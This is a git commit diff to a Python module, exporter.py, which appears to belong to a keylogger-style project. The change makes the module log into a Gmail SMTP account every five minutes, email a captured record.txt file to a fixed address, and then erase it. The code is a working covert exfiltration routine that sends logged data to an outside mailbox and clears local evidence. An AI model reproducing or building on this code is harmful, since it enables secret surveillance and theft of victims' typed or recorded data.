b82bb75cfdefef7c095a8ff74bff1e9a264b3405
connor <connortheguy12@gmail.com>
2019-04-11 01:25:28 -0400

    added Pause functionality and fixed date/time in email subject

--- exporter.py
+++ exporter.py
@@ -3,6 +3,7 @@ Used for exporting record.txt via email
 """
 import smtplib
 import datetime
+import pause
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
@@ -20,27 +21,29 @@ REC_PATH = "record.txt"
 
 
 def export():
-    # Set up connection / login to email account
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(FRM_ADDRESS, FRM_PSWD)
+    while True:
+        pause.minutes(5)
+        # Set up connection / login to email account
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(FRM_ADDRESS, FRM_PSWD)
 
-    # Create the headers for the email
-    msg = MIMEMultipart()
-    msg['From'] = FRM_ADDRESS
-    msg['To'] = TO_ADDRESS
-    msg['Subject'] = datetime.datetime
+        # Create the headers for the email
+        msg = MIMEMultipart()
+        msg['From'] = FRM_ADDRESS
+        msg['To'] = TO_ADDRESS
+        msg['Subject'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Open record.txt as a MINEBase object (Necessary for attaching to email)
-    file = MIMEBase('application', 'octet-stream')
-    file.set_payload(open(REC_PATH, 'rb').read())
-    encoders.encode_base64(file)
-    file.add_header('Content-Disposition', 'attachment; filename="text.txt"')
-    msg.attach(file)
+        # Open record.txt as a MINEBase object (Necessary for attaching to email)
+        file = MIMEBase('application', 'octet-stream')
+        file.set_payload(open(REC_PATH, 'rb').read())
+        encoders.encode_base64(file)
+        file.add_header('Content-Disposition', 'attachment; filename="text.txt"')
+        msg.attach(file)
 
-    # Send and close connection to mail server
-    server.sendmail(FRM_ADDRESS, TO_ADDRESS, msg)
-    server.quit()
+        # Send and close connection to mail server
+        server.sendmail(FRM_ADDRESS, TO_ADDRESS, msg)
+        server.quit()
 
-    # Erases .txt file to avoid repeat data (May interfere with actual logging..?)
-    open(REC_PATH, 'w').close()
+        # Erases .txt file to avoid repeat data (May interfere with actual logging..?)
+        open(REC_PATH, 'w').close()
